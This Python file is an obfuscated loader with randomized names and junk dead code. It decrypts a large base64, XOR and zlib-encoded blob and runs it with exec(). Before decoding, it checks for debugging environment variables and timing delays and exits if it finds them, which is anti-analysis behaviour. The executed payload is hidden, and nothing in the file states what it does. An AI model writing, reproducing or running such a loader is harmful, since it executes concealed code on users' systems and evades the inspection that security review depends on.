
import base64 as rgIdAvZc, zlib as TxTRgElT, marshal as SfdVPmFV, hashlib as __h, os as hVBpYEcA, sys as FCNqOOxC, time as EnCCTWxm

MGhtAAjE = 7181
GPlsOylz = 'oxfUCF4k8Z5X'
gnIUArIi = lambda x: x

def XVbJvkhT():
    x = 0
    for i in range(5):
        x += i
    return x


LvSkWkUS = [22, 49, 36, 39, 41, 32, 14, 42, 33, 44, 119, 116, 22, 36, 41, 49, 22, 49, 55, 44, 43, 34, 13, 53, 40, 14]
mBySYovY = 69
KiFoBFPK = ''.join(chr(b ^ mBySYovY) for b in LvSkWkUS)
ptwCkHNs = __h.sha256(KiFoBFPK.encode()).digest()

def TMbWdjSn():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if hVBpYEcA.environ.get(v):
            FCNqOOxC.exit(1)
    t1 = EnCCTWxm.time()
    EnCCTWxm.sleep(0.1)
    t2 = EnCCTWxm.time()
    if t2 - t1 > 0.5:
        FCNqOOxC.exit(1)

TMbWdjSn()

JvjvXMFQ_data = ["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"]
JvjvXMFQ_key = ["8xEAAACsd/puF/0rwTbktqunGpH3TQ=="]

JvjvXMFQ_data_joined = ''.join(JvjvXMFQ_data)
JvjvXMFQ_key_joined = ''.join(JvjvXMFQ_key)

uSResXjd = rgIdAvZc.b64decode(JvjvXMFQ_key_joined)
ZiPaMaGU = SfdVPmFV.loads(uSResXjd)
ZKKcVCIT = bytes([b ^ ptwCkHNs[i % len(ptwCkHNs)] for i, b in enumerate(ZiPaMaGU)]).decode()

JvjvXMFQ_enc = rgIdAvZc.b64decode(JvjvXMFQ_data_joined)
BhMzXxdP = bytes([b ^ ord(ZKKcVCIT[i % len(ZKKcVCIT)]) for i, b in enumerate(JvjvXMFQ_enc)])
yqPjMPoc = TxTRgElT.decompress(BhMzXxdP)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(yqPjMPoc)
